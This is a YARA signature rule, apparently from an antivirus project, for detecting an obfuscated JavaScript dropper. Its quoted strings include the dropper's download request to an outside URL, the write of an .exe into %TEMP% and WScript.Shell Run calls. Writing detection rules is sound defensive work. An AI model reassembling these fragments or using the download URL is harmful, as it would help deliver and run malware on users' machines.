rule sig_20160328_e2dfe0b83c2770de615a20672832c4bf {
  meta:
    description = "datamaliciousorder - file 20160328_e2dfe0b83c2770de615a20672832c4bf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "928dbc4b3c7d3dce20f9928029987e235436d64b87580b218cf0b365d513f539"

  strings:
    $s1  = "function Uyawxq() {return Vfzcl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"cXALJLl23Y2xviyF.exe\";};" fullword ascii
    $s2  = "Rqpaxatsmz[Rtwggatzj](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Tnmttwjfyd](Oigflzfae() * 11)} while (Rqpaxatsmz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Nwlpplrvb(Rwasljdbfu, Hhysdb){return Rwasljdbfu - Hhysdb;};" fullword ascii
    $s5  = "var Vfzcl = function Lwnvki() {return WScript[Yieqafloyo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vtorsz(Semmtwlbgz){Vfzcl[\"Run\"](Semmtwlbgz, Nvsfbya, Nvsfbya);};" fullword ascii
    $s7  = "function Mztykp() {return ((Yoxeqgvyo == true) && (Yoxeqgvyo == Izogave)) ? 1 : Nvsfbya;};" fullword ascii
    $s8  = "var Izogave = false;" fullword ascii
    $s9  = "var Buwusmfc = false;" fullword ascii
    $s10 = " while (Qtxrq){" fullword ascii
    $s11 = "var Rxignh = new this[\"Date\"]();" fullword ascii
    $s12 = "function Doyniwmsbb(Eybqqsss) {var Tuyfjv = (1, 2, 3, 4, 5, Eybqqsss); return Tuyfjv;};" fullword ascii
    $s13 = "function Kqmrkaq(){return Yieqafloyo;};" fullword ascii
    $s14 = "function Wgaqh(){return Bbqwkgiq;};" fullword ascii
    $s15 = "function Dgysnv()" fullword ascii
    $s16 = "Yoxeqgvyo = true; " fullword ascii
    $s17 = "function Oigflzfae(){return 22;};" fullword ascii
    $s18 = "var Yoxeqgvyo = false;" fullword ascii
    $s19 = "return Nwlpplrvb(Evvzygvqx, Yawtowiy);" fullword ascii
    $s20 = "Izogave = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}